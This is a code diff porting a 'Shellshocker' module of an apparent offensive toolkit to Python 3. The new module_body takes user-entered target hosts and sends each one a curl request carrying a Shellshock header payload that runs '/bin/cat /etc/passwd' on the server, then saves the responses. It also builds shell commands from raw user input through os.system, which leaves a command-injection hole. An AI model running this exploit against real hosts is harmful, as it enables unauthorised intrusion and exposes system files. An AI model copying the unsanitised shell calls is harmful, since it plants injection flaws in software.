@@ -23,21 +23,21 @@ except ImportError:
 # Put your module information here.
 info = {
         "name": "Shellshocker", # Module filename (Change this; I recommend you to use the filename as the module name.)
-        "version": "1.0", # version
+        "version": "2.0", # version
         "author": "NullArray", # Author
         "desc": "A bash script that tests [a list of] hosts for the shellshock vulnerability.", # Brief description
         "email": "none", # Email
-        "authorinfo": "none", # Additional information about the author; this could be
+        "authorinfo": "Ported to Python 3 by Catayao56", # Additional information about the author; this could be
         "lastupdate": "Mar. 05, 2018",                     # a website of the author.
         # The date format is MONTH, DD, YYYY e.g.: Jan. 4, 2018
-        "usingapi": True, # Is this module using Shadow Suite's API?
+        "usingapi": "True", # Is this module using Shadow Suite's API?
         "needsroot": "1", # Does this module needs root permissions?
                                           # 0 == True; any number means false.
 }
-dependencies = ['Bash'] # Put needed dependencies here.  
+dependencies = ['none'] # Put needed dependencies here.  
 
 # Changelog of the module
-changelog = "Version 1.0:\nInitial module release"
+changelog = "Version 2.0:\nPorted to Python by Catayao56\n\nVersion 1.0:\nInitial module release"
 # Changelog format:
 #
 # changelog = "Version 2.0:\nUpdate Description\n\nVersion1.0\nInitial module release"
@@ -98,11 +98,18 @@ def module_body():
     print("Shellshocker :: Test [a list of] hosts for the shellshock vulnerability.\n")
     # cur_no_hosts is the current number of hosts entered.
     # no_of_hosts is the target number of hosts needed. (RIP Grammar)
+    path_to_hosts = 'modules/shellshocker_hosts.temp'
+    path_to_output = 'output'
     cur_no_hosts = 0
     no_of_hosts = input("How many hosts do you want to test? > ")
+    cur_no_hosts = int(cur_no_hosts)
     no_of_hosts = int(no_of_hosts)
     while no_of_hosts != cur_no_hosts:
         TARGET = input("Target host > ")
-        os.system("echo \'" + TARGET + "\' >> modules/SHELLSHOCKER/hosts.temp")
-    print("[i] Running module...")
-    os.system("cd modules/SHELLSHOCKER && bash shellshocker.sh")
+        os.system("echo \'" + TARGET + "\' >> " + path_to_hosts)
+        cur_no_hosts = cur_no_hosts + 1
+    output_name = input("Output filename > ")
+    output = 'output/' + output_name
+    os.system("cat " + path_to_hosts + " | xargs -I % bash -c \'curl % -H \"custom:() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd\" && echo ----END OF RESPONSE----\' | tee " + output)
+    os.system("rm " + path_to_hosts)
+    API.Class().finish()
